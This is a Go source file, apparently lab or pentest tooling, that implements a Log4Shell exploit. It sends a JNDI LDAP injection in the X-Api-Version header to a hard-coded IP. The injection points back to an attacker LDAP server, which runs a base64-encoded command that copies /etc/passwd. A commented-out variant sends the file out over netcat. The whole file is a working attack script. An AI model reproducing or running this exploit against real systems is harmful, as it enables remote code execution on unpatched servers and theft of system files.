package payload

import (
	// "bufio"
	// "os"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"myapp/lib/sysinfo"
	"net/http"
	"time"
)

func PayloadInput() {
	var payloadcmd string
	targetip := "168.138.44.152"
	targetport := "8080"
	sourceip, err := sysinfo.GetIntIP()
	if err != nil {
		fmt.Println("Error:", err)
		return
	}

	fmt.Println("Testing curl...")
	for {
		fmt.Println("Enter the payload command:")
		// scanner := bufio.NewScanner(os.Stdin)
		// if scanner.Scan() {
		// 	payloadcmd = scanner.Text()
		// }
		// payloadcmd = "cat /etc/passwd > /tmp/passwd.txt && nc " + sourceip.String() + " 1304 < /tmp/passwd.txt"
		payloadcmd = "cat /etc/passwd > /tmp/passwd.txt"
		encodedpayloadcmd := base64.StdEncoding.EncodeToString([]byte(payloadcmd))
		targeturl := "http://" + targetip + ":" + targetport
		req, err := http.NewRequest(("GET"), targeturl, nil)
		if err != nil {
			fmt.Println("Error:", err)
			return
		}
		req.Header.Add("X-Api-Version", "${jndi:ldap://"+sourceip.String()+":1389/Basic/Command/Base64/"+encodedpayloadcmd+"}")
		fmt.Println("Sending payload...")
		client := &http.Client{
			Timeout: 10 * time.Second,
		}
		resp, err := client.Do(req)
		if err != nil {
			fmt.Println("Error:", err)
			fmt.Println("Please try again.")
			continue
		}
		defer resp.Body.Close()
		responseBody, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			fmt.Println("Error:", err)
			fmt.Println("Please try again.")
			continue
		}
		if string(responseBody) == "Hello, world!" {
			fmt.Println("Payload sent. Expoloit successful.")
		} else {
			fmt.Println("Payload sent failed. Please try again.")
			continue
		}
		break
	}
}
